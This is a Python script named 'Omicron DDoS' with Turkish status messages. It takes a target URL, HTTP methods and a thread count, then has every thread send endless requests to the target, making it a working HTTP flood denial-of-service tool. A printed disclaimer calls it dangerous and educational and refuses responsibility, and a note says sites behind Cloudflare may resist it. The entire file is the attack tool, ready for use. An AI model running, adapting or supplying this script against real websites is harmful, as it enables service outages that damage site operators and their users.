# Developed by omicr0n
import argparse
import threading
import requests
from colorama import Fore, Style
from os import system
import os
import art

menu_shown = False
my_art = art.text2art("omicron", font='shadow')
text = f"{Fore.MAGENTA}Omicron||DDos{Style.RESET_ALL}"

def show_menu():
    global menu_shown
    if not menu_shown:
        system("cls||clear")
        print(Fore.LIGHTBLUE_EX + my_art)
        menu_shown = True

def attack(target, methods):
    methods = methods.split(',')
    while True:
        for method in methods:
            try:
                response = requests.request(method.upper(), target)
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[+] {text}{Fore.GREEN} Başarıyla gönderildi {target}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[-] {text}{Fore.RED} Gönderi Hatası! {Style.RESET_ALL}")
            except requests.exceptions.RequestException as e:
                print(f"{Fore.RED}[-] {text}{Fore.RED} Gönderi Hatası! {method.upper()} request to {target} - {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS Attack Script")
    parser.add_argument("-target", required=True, help="Target URL (e.g., https://example.com/)")
    parser.add_argument("-methods", required=True, help="Saldırıda kullanılacak, ayrılmış HTTP yöntemleri (ör. GET,POST)")
    parser.add_argument("-threads", required=True, type=int, help="Saldırıda kullanılacak iş parçacığı sayısı")
    args = parser.parse_args()
    show_menu()
    print(f"{Fore.RED}[!] Warning: Tehlikeli bir programdır. Eğitim amaçlı yapılmıştır. Kesinlikle sorumluluk almamaktayım!.{Style.RESET_ALL}")
    print("\n")
    print(f"{Fore.YELLOW}[!] Note: Eğer hedef sitede cloudflare vs. koruma varsa işe yaramayabilir.{Style.RESET_ALL}")

    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=attack, args=(args.target, args.methods))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
